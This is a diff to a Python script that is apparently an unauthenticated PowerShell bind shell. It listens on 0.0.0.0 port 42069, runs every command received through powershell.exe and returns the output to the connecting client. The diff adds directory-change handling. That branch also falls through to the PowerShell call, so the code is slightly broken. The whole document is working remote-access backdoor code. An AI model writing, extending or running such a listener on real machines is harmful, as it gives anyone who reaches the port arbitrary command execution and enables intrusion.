@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 
 HOST = '0.0.0.0' # Listen on all network interfaces
 PORT = 42069    # Choose a port number
@@ -17,7 +18,18 @@ while True:
     if not command:
         break
 
-    # Execute the PowerShell command and send the output back to the client
+    # Split command and arguments
+    cmd_parts = command.split()
+    cmd = cmd_parts[0]
+    args = cmd_parts[1:]
+
+    if cmd == 'cd':
+        try:
+            os.chdir(args[0])
+            conn.sendall(b'Successfully changed directory\n')
+        except Exception as e:
+            conn.sendall(str(e).encode())
+        # Execute the PowerShell command and send the output back to the client
     try:
         output = subprocess.check_output(['powershell.exe', '-NoLogo', '-NoProfile', '-NonInteractive', '-Command', command], stderr=subprocess.STDOUT, timeout=10)
         conn.sendall(output)
